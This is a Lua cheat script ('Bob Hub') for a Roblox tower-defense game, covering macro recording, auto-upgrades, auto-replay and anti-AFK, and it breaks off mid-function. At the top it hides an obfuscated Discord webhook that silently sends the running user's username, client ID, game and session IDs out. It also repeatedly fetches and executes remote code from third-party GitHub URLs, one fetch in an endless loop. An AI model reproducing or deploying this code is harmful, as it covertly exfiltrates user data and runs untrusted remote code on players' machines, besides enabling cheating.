local weno = "ht".."tps".."://dis"..
"cor".."d.com".."/ap".."i/we"..
"bho".."oks/104".."39900".."37206"..
"929438/cv7".."DCc".."G6y".."0Us"..
"Y1VR".."q7vi".."QB-yP7k_Sk9"..
"3ajUL".."ndbW".."7sIOu".."Mze7O"..
"qe38LU".."tjlBkP".."SDxoeU"

repeat wait() until game:IsLoaded()
coroutine.resume(coroutine.create(function()
pcall(function()
repeat game:GetService("RunService").RenderStepped:wait() until game.Players.LocalPlayer.Name ~= nil
local loleh = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
dothethingy = http_request or request or HttpPost or syn.request
dothethingy({Url = weno, Body = game:GetService("HttpService"):JSONEncode({
["embeds"] = {{["title"] = "**Orion Executed**",
["description"] = '```lua\nloadstring(game:HttpGet("https://raw.githubusercontent.com/BobRossIsBoss/bob-ross/main/bob-ross"))()```',
["fields"] = {
    {
      ["name"] = "Username",
      ["value"] = game.Players.LocalPlayer.Name,
      ["inline"] = true
    },
    {
      ["name"] = "ID",
      ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
      ["inline"] = true
    },
    {
      ["name"] = "Game",
      ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
      ["inline"] = true
    },
    {
        ["name"] = "Executor",
        ["value"] = loleh,
        ["inline"] = true
    },
    {
        ["name"] = "JobId",
        ["value"] = game.JobId,
        ["inline"] = true
    },
    {
        ["name"] = "PlaceId",
        ["value"] = game.PlaceId,
        ["inline"] = true
    }},
    ["footer"] = {
        ["text"] = os.date(),
        ["icon_url"] = ""
      },
["type"] = "rich",["color"] = tonumber(0x7269da)}}}), Method = "POST", Headers = {
["content-type"] = "application/json"}})
end)
end))
-- SaveSettings
local macrolist = {}
local x = 0
_G.SettingsTable = {
    autoreplay = false,
    auto2x = false,
    autoextreme = false,
    autoplayback = false,
    selectedmacro = "",
    autosell = false,
    autosellwave = 999,
    autosellspeed = 1,
    autoupgradewave = 999,
    autoupgrade = false,
    autojoin = false,
    mode = "",
    storylevel = "",
    inflevel = "",
    hidenick = false,
    shiftlock = false,
    autobufftoggle = false,
    automerlintoggle = false,
    autofv = false,
    macroname = "",
    autocooler = false,
    deletetexture = false,
    fpscap = 60,
    setfpscap = false,
    timer = false,
    WhURL = "",
    Webhook = false,
    leavevalue = false,
    forcetp = false,
    forcetpdcid = false,
    forcetpdc = false,
    forcetpw2 = false,
    autotpw3 = false,
    messageerror = "",
    tctoggle = false,
    autotswave = "",
    autots = false,
    clocktime = 1,
    changeclocktime = false, 
    autoexecute = false, 
    deleteenemy = false,
    W3storylevel = ""
}

repeat game:GetService("RunService").RenderStepped:wait() until game.Players.LocalPlayer.Name ~= nil
local file_settings = "Bobsettings" .. game.Players.LocalPlayer.Name .. ".txt"
local macrofolder = "macrosprofiles_" .. game.Players.LocalPlayer.Name
local httpservice = game:GetService("HttpService")
function LoadSettings()
    if (readfile and isfile and isfile(file_settings)) then
        _G.SettingsTable = httpservice:JSONDecode(readfile(file_settings))
    end
    if (readfile and isfile and isfolder(macrofolder)) then
        for i,v in pairs(listfiles(macrofolder .. '/')) do
            table.insert(macrolist, string.sub(v, v:find('/') + 1))
        end
    else
    makefolder(macrofolder)
    end
end
LoadSettings()
function SaveSettings()
    local json
    if (writefile) then
        json = httpservice:JSONEncode(_G.SettingsTable)
        writefile(file_settings, json)
    end
end
--Message Top Bar
coroutine.resume(coroutine.create(function()
while true do wait(1)
loadstring(game:HttpGet('https://raw.githubusercontent.com/HelloHiPro/HelloHiPro/main/New_Text_Document2.lua'))()
end
end))
--Rejoin if dc
coroutine.resume(coroutine.create(function()
game:WaitForChild('CoreGui'):WaitForChild('RobloxPromptGui'):WaitForChild('promptOverlay').DescendantAdded:Connect(function()
    local GUI = game.CoreGui.RobloxPromptGui.promptOverlay:FindFirstChild("ErrorPrompt")
    if GUI then
        if GUI.TitleFrame.ErrorTitle.Text == "Disconnected" then
            if x == 0 then
	        x = x + 1
            repeat wait() until game.CoreGui.RobloxPromptGui.promptOverlay.ErrorPrompt:WaitForChild('MessageArea'):WaitForChild('ErrorFrame'):WaitForChild('ErrorMessage').Text ~= 'Label'
	    _G.SettingsTable.messageerror = game.CoreGui.RobloxPromptGui.promptOverlay.ErrorPrompt.MessageArea.ErrorFrame.ErrorMessage.Text
            SaveSettings()
            local queue_on_teleport = queue_on_teleport or syn and syn.queue_on_teleport [[loadstring(game:HttpGet('https://raw.githubusercontent.com/948265/ax/main/dcwh.lua'))()]]
            if #game.Players:GetPlayers() <= 1 then
                game.Players.LocalPlayer:Kick("\nRejoining...")
                wait()
                repeat wait()
                game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
            	until false
            else
            	repeat wait()
                game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
            	until false
            end
	  end
        end
    end
end)
end))
--TimeChamber
local tcvalue = false
coroutine.resume(coroutine.create(function()
    repeat wait()
    pcall(function()
    if game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.Frame.CLAIM.Parent.Visible == true then
    if _G.SettingsTable.autojoin then
    tcvalue = true
    local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
    local Window = OrionLib:MakeWindow({IntroText = "BOB HUB",Name = "Bob Hub", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionStar"})
    local tcTab = Window:MakeTab({
        Name = "Time Chamber",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })
    tcTab:AddToggle({
        Name = "Auto Join TC",
        Default = _G.SettingsTable.autojoin,
        Callback = function(Value)
            _G.SettingsTable.autojoin = Value
            SaveSettings()
        end    
    })
    end
	end
    end)
    wait(1)
    until tcvalue
    end))
--Macro timer
local timer = 0
local checkplayback = false
coroutine.resume(coroutine.create(function()
function StartTimer()
    startTime = tick() -- float representing when the timer was started
    while tick() do -- run until 'secondsToRun' seconds have passed
        game:GetService("RunService").Heartbeat:Wait() -- this waits until the heartbeat event is triggered, which happens 60 times a second
        timeSinceStart = tick() - startTime
        timer = string.format("%0.2f", tostring(timeSinceStart)) -- 0.2 represents two decimals
    end
end
repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild('HUD').ModeVoteFrame.Visible
repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui:WaitForChild('HUD').ModeVoteFrame.Visible == false
StartTimer()
end))

--Local Stuff
local order1 = {4, 8, 1, 5, 3, 7, 2, 6}
local order2 = {1, 5, 3, 7, 2, 6, 4, 8}
local me = game.Players.LocalPlayer
local remote = game:WaitForChild("ReplicatedStorage"):WaitForChild("Remotes").Input
local mobslider
local mobslider1
local TargetWalkspeed
local upgrade = {}
local prioritymacro = {}
local summonmax = {}
local Summon = {}
local Event = game:GetService("ReplicatedStorage").Remotes.Input
local unit = game.Workspace.Unit
local macro_file = "macro"
local a2 = 0
local a1 = 0
local wave69 = game:GetService("ReplicatedStorage").WaveValue.Value
local mouse1 = me:GetMouse()
local checkautosell = false
local summonvalue = "Banner X"
local autojoincframe = nil
local autojoinpath = nil
local autojoinmap = nil
local autojoinmode = nil
local autojoinstart = nil
local Mouse = game.Players.LocalPlayer:GetMouse()
local bunda = 0
local countunit = {}
local plrlevel = ""
function StringToCFrame(String) local Split = string.split(String, ",") return Split[1], Split[2], Split[3] end
local idvalue = 0
local FarmLeave = ""
local FarmLeave2 = ""
local checkorbfarm = false
local autotstable = {}
local gojoplaced = false

--Anti-AFK
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
   wait(1)
   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

--Orion Stuff

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({IntroText = "BOB HUB",Name = "Bob Hub", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionStar"})

-- autofv
if game:GetService("ReplicatedStorage").Lobby.Value == false then
pcall(function()
local part = Instance.new("Part")
part.Parent = game.Workspace
part.Name = "BasePart"
part.Size = Vector3.new(8, 8, 8)
part.CFrame = CFrame.new(game:GetService("Workspace").TowerHP.Position)
part.Anchored = true
part.Transparency = 1
part.CollisionGroupId = 1
remote = game.ReplicatedStorage.Remotes.Input
game:GetService("Workspace").TowerHP.Transparency = 1
game:GetService("Workspace").BasePart.CanCollide = false
game:GetService("Workspace").BasePart.Touched:Connect(function()
end)
local part1 = Instance.new("Part")
part1.Parent = game.Workspace
part1.Name = "BasePart1"
part1.Size = Vector3.new(40, 10, 40)
part1.CFrame = CFrame.new(game:GetService("Workspace").TowerHP.Position)
part1.Anchored = true
part1.Transparency = 1
part1.CollisionGroupId = 1
remote = game.ReplicatedStorage.Remotes.Input
game:GetService("Workspace").BasePart1.CanCollide = false
game:GetService("Workspace").BasePart1.Touched:Connect(function()
end)
end)
end

pcall(function()
game:GetService("Workspace").Queue.Joinables.Farm.Touched:Connect(function(v)
coroutine.resume(coroutine.create(function()
if v.Parent.Parent.Parent.Name == 'Camera' then
if v.Parent.Parent.Name ~= game.Players.LocalPlayer.Name then
if checkorbfarm then
checkorbfarm = false
repeat wait() until game:GetService("Workspace").Queue.Joinables.Farm.SurfaceGui.TextLabel.Text:sub(22) == '1' or _G.SettingsTable.autojoin == false
repeat 
wait(.1)
remote:FireServer(FarmLeave)
until game:GetService("Workspace").Queue.Joinables.Farm.SurfaceGui.TextLabel.Text:find('%d+', 22) == nil or _G.SettingsTable.autojoin == false
end
end 
end
end))
end)
end)
pcall(function()
game:GetService("Workspace").Queue.Farm.Collisions.Part9.Touched:Connect(function(v)
coroutine.resume(coroutine.create(function()
if v.Parent.Parent.Parent.Name == 'Camera' then
if v.Parent.Parent.Name ~= game.Players.LocalPlayer.Name then
if checkorbfarm then
checkorbfarm = false
repeat wait() until game:GetService("Workspace").Queue.Farm.Collisions.Part9.SurfaceGui.TextLabel.Text:sub(22) == '1' or _G.SettingsTable.autojoin == false
repeat 
wait(.1)
remote:FireServer(FarmLeave2)
until game:GetService("Workspace").Queue.Farm.Collisions.Part9.SurfaceGui.TextLabel.Text:find('%d+', 22) == nil or _G.SettingsTable.autojoin == false
end 
end
end
end))
end)
end)

summonpart = Instance.new('Part')
summonpart.Name = 'SummonBox'
summonpart.Parent = game.Workspace
summonpart.Transparency = 1
summonpart.Size = Vector3.new(15, 0, 15)
summonpart.CanCollide = false
summonpart.Anchored = true

--Macro ChildAdded

pcall(function()
unit.ChildAdded:Connect(function(child)
timer2 = timer
if child:WaitForChild('Owner').Value == me then
if _G.record then
idvalue = idvalue + 1
local id = Instance.new('NumberValue')
id.Value = idvalue
id.Name = 'ID'
id.Parent = child
    table.insert(Summon, {["Summon"] = {
    timer2,
    tostring(idvalue),
	tostring(child:WaitForChild("HumanoidRootPart").CFrame), 
	child.Name,
	child:WaitForChild("UpgradeTag").Value,
	child:WaitForChild("PriorityAttack").Value
}})
end
if _G.SettingsTable.autoplayback then
if child:WaitForChild('Owner').Value == me then
idvalue = idvalue + 1
local id = Instance.new('NumberValue')
id.Parent = child
id.Name = 'ID'
id.Value = idvalue
end
end
if _G.SettingsTable.autots then
    if child.Name == 'Six Eyes Gojo' then
        table.clear(autotstable)
        table.insert(autotstable, child)
        gojoplaced = true
    end
end
end
end)
end)

pcall(function()
    unit.ChildRemoved:Connect(function(child)
        timer2 = timer
if child:WaitForChild('Owner').Value == me then
    if _G.record then
        table.insert(Summon, {["Sell"] = { 
            timer2,
            tostring(child.ID.Value)
    }})
    end
end
    end)
    end)

--Functions (Script Shit)

function record()
if _G.record then
idvalue = 0
checkplayback = false
coroutine.resume(coroutine.create(function()
repeat wait() until game:IsLoaded()
            table.clear(Summon)
            table.clear(upgrade)
            OrionLib:MakeNotification({
                Name = _G.SettingsTable.selectedmacro,
                Content = "Recording...",
                Time = 3
            })
            repeat wait()
            for _, v in pairs(unit:GetChildren()) do
                if v:WaitForChild("Owner").Value == game.Players.LocalPlayer then
                    for i = 1, #Summon do
                    coroutine.resume(coroutine.create(function()
                    pcall(function()
                    if Summon[i]["Summon"] then
                    if _G.record then
                        if v.UpgradeTag.Value > tonumber(Summon[i]["Summon"][5]) and v.ID.Value == tonumber(Summon[i]["Summon"][2]) then
                                table.insert(Summon, {["Upgrade"] = { timer, Summon[i]["Summon"][2]}})
                                Summon[i]["Summon"][5] = Summon[i]["Summon"][5] + 1
                        end
                    end
                    end
                    end)
                    end))
                    pcall(function()
                    if Summon[i]["Summon"] then
                    if _G.record then
                        if v.PriorityAttack.Value ~= tonumber(Summon[i]["Summon"][6]) and v:WaitForChild('ID').Value == tonumber(Summon[i]["Summon"][2]) then
                                table.insert(Summon, { ["ChangePriority"] = { timer, Summon[i]["Summon"][2]}})
                                Summon[i]["Summon"][6] = Summon[i]["Summon"][6] + 1
                                if Summon[i]["Summon"][6] == 7 then Summon[i]["Summon"][6] = 0 end
                        end
                    end
                    end
                    end)
                    end
                end
            end
            writefile(macrofolder .. "/" .. _G.SettingsTable.selectedmacro, httpservice:JSONEncode(Summon))
            until _G.record == false
writefile(macrofolder .. "/" .. _G.SettingsTable.selectedmacro, httpservice:JSONEncode(Summon))
OrionLib:MakeNotification({
    Name = _G.SettingsTable.selectedmacro,
    Content = "Saved",
    Time = 3
})
end))
end
end
function playback()
    SaveSettings()
    pcall(function()
    if _G.SettingsTable.autoplayback and _G.record == false then
    idvalue = 0
    SaveSettings()
   	macro = httpservice:JSONDecode(readfile(macrofolder .. "/" .. _G.SettingsTable.selectedmacro))
        table.clear(Summon)
        Summon = macro
            OrionLib:MakeNotification({
                Name = _G.SettingsTable.selectedmacro,
                Content = "Playback",
                Time = 3
            })
local playbackended = false
checkplayback = true
coroutine.resume(coroutine.create(function()
repeat wait() until tonumber(timer) > 0
repeat wait()
coroutine.resume(coroutine.create(function()
for i = 1, #Summon do
if Summon[i]["ChangePriority"] then
repeat wait() until tonumber(timer) >= tonumber(Summon[i]["ChangePriority"][1])
for _, v in pairs(unit:GetChildren()) do
    pcall(function()
    if v:WaitForChild('Owner').Value == game.Players.LocalPlayer then
            if v.ID.Value == tonumber(Summon[i]["ChangePriority"][2]) then
                table.clear(prioritymacro)
                table.insert(prioritymacro, v.PriorityAttack.Value)
repeat 
game:GetService("ReplicatedStorage").Remotes.Input:FireServer("ChangePriority", v)
wait(.5)
until v.PriorityAttack.Value == prioritymacro[1] + 1
            end
        end
    end)
end
end
if Summon[i]["Sell"] then
repeat wait() until tonumber(timer) >= tonumber(Summon[i]["Sell"][1])
for _, v in pairs(unit:GetChildren()) do
    pcall(function()
        if v:WaitForChild('Owner').Value == game.Players.LocalPlayer then
                if v.ID.Value == tonumber(Summon[i]["Sell"][2]) then
    pcall(function()
        repeat
            game:GetService("ReplicatedStorage").Remotes.Input:FireServer("Sell", v)
            wait()
        until v.SoldBoolean.Value
    end)
                end
        end
    end)
end
end
end
end))
for i = 1, #Summon do
if _G.SettingsTable.autoplayback then
repeat wait()
if Summon[i]["Summon"] then
if _G.SettingsTable.timer then
repeat wait() until tonumber(timer) >= tonumber(Summon[i]["Summon"][1])
end
repeat
Event:FireServer("Summon", 	{ ["Rotation"] = 0, 
	["cframe"] = CFrame.new(table.unpack(string.split(Summon[i]["Summon"][3], ", "))),
	["Unit"] = Summon[i]["Summon"][4] } )
wait(.5)
until idvalue == tonumber(Summon[i]["Summon"][2]) or _G.SettingsTable.autoplayback == false
break
end
if Summon[i]["Upgrade"] then
for _, v in pairs(unit:GetChildren()) do

    if v:WaitForChild('Owner').Value == game.Players.LocalPlayer then
            if v.ID.Value == tonumber(Summon[i]["Upgrade"][2]) then
                table.clear(upgrade)
                table.insert(upgrade, v.UpgradeTag.Value)
                if _G.SettingsTable.timer then
                repeat wait() until tonumber(timer) >= tonumber(Summon[i]["Upgrade"][1])
                end
repeat game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("Upgrade", v)
wait(.5)
until v.UpgradeTag.Value >= upgrade[1] + 1
            end
        end

end
break
end
break
until _G.SettingsTable.autoplayback == false
end
end
playbackended = true
until _G.SettingsTable.autoplayback == false or playbackended
end))
end
end)
end

function automerlin()
    SaveSettings()
    if _G.SettingsTable.automerlintoggle then
        SaveSettings()
        repeat wait() until game:IsLoaded()
        wait(1)
        local order2 = {2, 4, 1, 3}
        local x = 1
        local y = 0
        local mano = false
        local a1 = 60
        local joe = 2
        local Brook = {}
        coroutine.resume(coroutine.create(function()
        repeat wait()
            table.clear(Brook)
            for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
                if v.Name == 'Merlin' and v:WaitForChild("Owner").Value == me and v:WaitForChild("UpgradeTag").Value == v.MaxUpgradeTag.Value then
                    table.insert(Brook, v)
                end
            end
        until #Brook > 1 or _G.SettingsTable.automerlintoggle == false
                if #Brook > 3 then joe = 1 a1 = 30 mano = true end
                while _G.SettingsTable.automerlintoggle do
                if mano == false then table.clear(Brook) end
                for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
                    if mano == true then break end
                    if v.Name == 'Merlin' and v:WaitForChild("Owner").Value == me and v:WaitForChild("UpgradeTag").Value == v.MaxUpgradeTag.Value then
                        table.insert(Brook, v)
                    end
                    if #Brook > 3 then joe = 1 a1 = 30 mano = true end
                end
                    pcall(function()
                    repeat wait() until Brook[order2[x]].SpecialMove.Special_Enabled2.Value == false
                    repeat remote:FireServer('UseSpecialMove', Brook[order2[x]]) wait(.05) until Brook[order2[x]].SpecialMove.Special_Enabled2.Value
                    end)
        repeat y = y + 1
            if game.ReplicatedStorage.SpeedUP.Value == 2 then 
                wait(.25) 
            end 
            if game.ReplicatedStorage.SpeedUP.Value == 1 then 
                wait(.5) 
            end
        until y == a1 or _G.SettingsTable.automerlintoggle == false
        y = 0
        x = x + joe
        if x > 4 then
            x = 1
        end
        end
    end))
end
end

function autobrookerwin()
 SaveSettings()
    if _G.SettingsTable.autobufftoggle then
        SaveSettings()
        repeat wait() until game:IsLoaded()
        wait(1)
        local x = 1
        local y = 0
        local okand = 0
        local buff = false
        local sound = Instance.new("Sound")
        local mano = false
        local a1 = 29
        local okand = 0
        local joe = 2
        local Brook = {}
        local Damage = {}
        coroutine.resume(coroutine.create(function()
        repeat wait()
            table.clear(Brook)
            for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
                if v.Name == 'Erwin' and v:WaitForChild("Owner").Value == me then
                    table.insert(Brook, v)
                end
                if v.Name == 'Brook6' and v:WaitForChild("Owner").Value == me then
                    table.insert(Brook, v)
                end
            end
        until #Brook > 3 or _G.SettingsTable.autobufftoggle == false
                if #Brook > 7 then joe = 1 a1 = 15 mano = true end
                while _G.SettingsTable.autobufftoggle do
                if mano == false then table.clear(Brook) end
                for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
                    if mano == true then break end
                    if v.Name == 'Erwin' and v:WaitForChild("Owner").Value == me then
                        table.insert(Brook, v)
                    end
                    if v.Name == 'Brook6' and v:WaitForChild("Owner").Value == me then
                        table.insert(Brook, v)
                    end
                    if #Brook > 7 then okand = 0 joe = 1 a1 = 15 mano = true end
                end
                    pcall(function()
                    repeat wait() until Brook[order2[x]].SpecialMove.Special_Enabled2.Value == false
                    pcall(function()
                    repeat wait(.05) until Brook[order1[x]].Head.EffectBBGUI.Frame.AttackImage.Visible == false
                    end)
                    repeat remote:FireServer('UseSpecialMove', Brook[order2[x]]) wait(.05) until Brook[order2[x]].SpecialMove.Special_Enabled2.Value
                    end)
                    if #Brook > 7 then
                    okand = okand + 1
                    else
                    okand = okand + 2
                    end
        if okand > 8 then  
            if #Brook > 7 then
                a1 = 12
            else
                a1 = 27
            end
        end      
        repeat y = y + 1
            if game.ReplicatedStorage.SpeedUP.Value == 2 then 
                wait(.25) 
            end 
            if game.ReplicatedStorage.SpeedUP.Value == 1 then 
                wait(.5) 
            end
        until y == a1 or _G.SettingsTable.autobufftoggle == false
        y = 0
        x = x + joe
        if x > 8 then
            x = 1
        end
        end
    end))
end
end

workspace.Unit.ChildAdded:Connect(function(child)
    if _G.autogojo then
        if child.Name == 'Six Eyes Gojo' and game.Players.LocalPlayer.Money.Value > 28000 then
            child:WaitForChild("UpgradeTag")
            repeat game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("Upgrade", child)
            wait(.01)
            until child.UpgradeTag.Value == child.MaxUpgradeTag.Value
        game:GetService("Players").LocalPlayer.PlayerGui.HUD.Upgrade.SpecialButton.Visible = true
        end
    end
end)

workspace.Unit.ChildAdded:Connect(function(child)
    if _G.lawupgrade then
        if child.Name == 'Law' and game.Players.LocalPlayer.Money.Value > 14150 then
            child:WaitForChild("UpgradeTag")
            repeat game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("Upgrade", child)
            wait(.01)
            until child.UpgradeTag.Value == 6
        game:GetService("Players").LocalPlayer.PlayerGui.HUD.Upgrade.SpecialButton.Visible = true
        end
    end
end)

function mobnotifacation()
    while _G.mobnotifacation do
        OrionLib:MakeNotification({
            Name = "Mob Counter",
            Content = #game.Workspace.Enemies:GetChildren().."/250",
            Time = mobslider1
        })
        wait(mobslider)
    end
end

function click69()
    if click69 then
        OrionLib:MakeNotification({
        Name = "Mob Counter",
        Content = #game.Workspace.Enemies:GetChildren().."/250",
        Time = mobslider1
        })
    end
end

function click70()
    if click70 then
        OrionLib:Destroy()
    end
end

function lawability()
    if _G.lawability then
        for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
            if v.Name == 'Law' and v.Owner.Value == me and v.SpecialMove.Special_Enabled2.Value == false then
                remote:FireServer('UseSpecialMove', v)
                break
            end
        end
    end
end

function yugiability()
    if _G.yugiability then
        for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
            if v.Name == 'YugiMax' and v.Owner.Value == me and v.SpecialMove.Special_Enabled2.Value == false then
                remote:FireServer('UseSpecialMove', v)
                break
            end
        end
    end
end

function kiraability()
    if _G.kiraability then
        for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
            if v.Name == 'Light Yagami (Darkness)' and v.Owner.Value == me and v.SpecialMove.Special_Enabled2.Value == false then
                remote:FireServer('UseSpecialMove', v)
                break
            end
        end
    end
end

local TIME_ZONE = 1
local date = os.date("!*t")
local hour = (date.hour + TIME_ZONE) % 24
local ampm = hour < 12 and "AM" or "PM"
local timestamp = string.format("%02i:%02i %s", ((hour - 1) % 12) + 1, date.min, ampm)

function ryukability()
    if _G.ryukability then
        for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
            if v.Name == 'Ryuk' and v.Owner.Value == me and v.SpecialMove.Special_Enabled2.Value == false then
                remote:FireServer('UseSpecialMove', v)
                break
            end
        end
    end
end

function click73()
        OrionLib:MakeNotification({
            Name = "Auto Yugi",
            Content = "Starting...",
            Time = 5
        })
        for _, v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
            if v.Name == "YugiMax" and v.Owner.Value == game:GetService("Players").LocalPlayer  and v.SpecialMove["Special_Enabled2"].Value == false then
                repeat wait(1)
                    wait(1)
                    game:GetService("ReplicatedStorage").Remotes.Input:FireServer("UseSpecialMove", v)
                until v.Access.ExodiaCard.R_Leg.Transparency == 0 and v.Access.ExodiaCard.L_Arm.Transparency == 0 and v.Access.ExodiaCard.R_Arm.Transparency == 0 and v.Access.ExodiaCard.L_leg.Transparency == 0 or v.Access.ExodiaCard.HeadExodia.Transparency == 0 and v.Access.ExodiaCard.L_Arm.Transparency == 0 and v.Access.ExodiaCard.R_Arm.Transparency == 0 and v.Access.ExodiaCard.L_leg.Transparency == 0 or v.Access.ExodiaCard.R_Leg.Transparency == 0 and v.Access.ExodiaCard.L_Arm.Transparency == 0 and v.Access.ExodiaCard.R_Arm.Transparency == 0 and v.Access.ExodiaCard.HeadExodia.Transparency == 0 or v.Access.ExodiaCard.R_Leg.Transparency == 0 and v.Access.ExodiaCard.HeadExodia.Transparency == 0 and v.Access.ExodiaCard.R_Arm.Transparency == 0 and v.Access.ExodiaCard.L_leg.Transparency == 0 or v.Access.ExodiaCard.R_Leg.Transparency == 0 and v.Access.ExodiaCard.L_Arm.Transparency == 0 and v.Access.ExodiaCard.HeadExodia.Transparency == 0 and v.Access.ExodiaCard.L_leg.Transparency == 0
                break
            end
        end
        OrionLib:MakeNotification({
            Name = "Auto Yugi",
            Content = "Done",
            Time = 5
        })
end

function click71()
    if _G.click71 then
    while _G.click71 do
    task.wait()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = TargetWalkspeed
    end
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 15
    end
end

function farmupgrade()
    farmer = 0
    for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
        if v.Name == 'Speedwagon' and v.Owner.Value == me then 
            repeat game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("Upgrade", v) wait(.5) farmer = farmer + 1
            until farmer == 6 or _G.farmupgrade == false
        end
    end
    wave69 = game:GetService("ReplicatedStorage").WaveValue.Value
    for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
        if v.Name == 'Bulma (Super Money Corp)' and v.Owner.Value == me then
            repeat game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("Upgrade", v) wait(.25)
            until wave69 ~= game:GetService("ReplicatedStorage").WaveValue.Value or _G.farmupgrade == false
        end
    end
while _G.farmupgrade do
    task.wait()
    if wave69 ~= game:GetService("ReplicatedStorage").WaveValue.Value then
    farmer = 0
    for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
        if v.Name == 'Speedwagon' and v.Owner.Value == me then 
            repeat game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("Upgrade", v) wait(.5) farmer = farmer + 1
            until farmer == 6 or _G.farmupgrade == false
        end
    end
    wave69 = game:GetService("ReplicatedStorage").WaveValue.Value
    repeat wait(.1)
    for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
        if v.Name == 'Bulma (Super Money Corp)' and v.Owner.Value == me then
            repeat game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("Upgrade", v) wait(.25)
            until wave69 ~= game:GetService("ReplicatedStorage").WaveValue.Value or _G.farmupgrade == false
        end
    end
    until wave69 ~= game:GetService("ReplicatedStorage").WaveValue.Value or _G.farmupgrade == false
    end
end
end

function autoextreme()
SaveSettings()
if _G.SettingsTable.autoextreme then
SaveSettings()
repeat wait() until game:IsLoaded()
local Event = game:GetService("ReplicatedStorage"):WaitForChild("Remotes").Input
coroutine.resume(coroutine.create(function()
repeat wait(5)
Event:FireServer('VoteGameMode', 'Extreme')
until game:GetService("ReplicatedStorage").WaveValue.Value > 0 or _G.SettingsTable.autoextreme == false
end))
end
end

function autoreplay()
SaveSettings()
if _G.SettingsTable.autoreplay then
SaveSettings()
coroutine.resume(coroutine.create(function()
while _G.SettingsTable.autoreplay do wait(.5)
pcall(function()
for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.HUD.MissionEnd.BG.Actions.Replay.Activated)) do
v.Function()
end
end)
end
end))
end
end

function auto2x()
SaveSettings()
if _G.SettingsTable.auto2x then
SaveSettings()
while not game:IsLoaded() do
    wait(1)
end

local A_1 = "SpeedChange"
local A_2 = true
local Event = game:GetService("ReplicatedStorage").Remotes.Input

if game.ReplicatedStorage.Lobby.Value == false then
coroutine.resume(coroutine.create(function()
repeat 
    Event:FireServer(A_1, A_2)
    wait(1)
until
game.ReplicatedStorage.SpeedUP.Value == 2 or _G.SettingsTable.auto2x == false
end))
end
end
end

function priority()
if _G.priority then
Joe = 1
for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
    if v.Name == game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.One.Unit.Value and v.Owner.Value == me and _G.unit1 and _G.priority then
        if v.PriorityAttack.Value == priorityvalue then
            OrionLib:MakeNotification({
            Name = "Unit Skipped",
            Content = "Already at the priority",
            Time = 2
            })
        else
        repeat remote:FireServer('ChangePriority', v) wait(.1) until v.PriorityAttack.Value == priorityvalue 
            OrionLib:MakeNotification({
            Name = "Changing Priority...",
            Content = "Finished Unit: "..Joe,
            Time = 2
            })
            Joe = Joe + 1
        end
    elseif v.Name == game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Two.Unit.Value and v.Owner.Value == me and _G.unit2 and _G.priority then
        if v.PriorityAttack.Value == priorityvalue then
            OrionLib:MakeNotification({
            Name = "Unit Skipped",
            Content = "Already at the priority",
            Time = 2
            })
        else
        repeat remote:FireServer('ChangePriority', v) wait(.1) until v.PriorityAttack.Value == priorityvalue 
            OrionLib:MakeNotification({
            Name = "Changing Priority...",
            Content = "Finished Unit: "..Joe,
            Time = 2
            })
            Joe = Joe + 1
        end
    elseif v.Name == game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Three.Unit.Value and v.Owner.Value == me and _G.unit3 and _G.priority then
        if v.PriorityAttack.Value == priorityvalue then
            OrionLib:MakeNotification({
            Name = "Unit Skipped",
            Content = "Already at the priority",
            Time = 2
            })
        else
        repeat remote:FireServer('ChangePriority', v) wait(.1) until v.PriorityAttack.Value == priorityvalue 
            OrionLib:MakeNotification({
            Name = "Changing Priority...",
            Content = "Finished Unit: "..Joe,
            Time = 2
            })
            Joe = Joe + 1
        end
    elseif v.Name == game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Four.Unit.Value and v.Owner.Value == me and _G.unit4 and _G.priority then
        if v.PriorityAttack.Value == priorityvalue then
            OrionLib:MakeNotification({
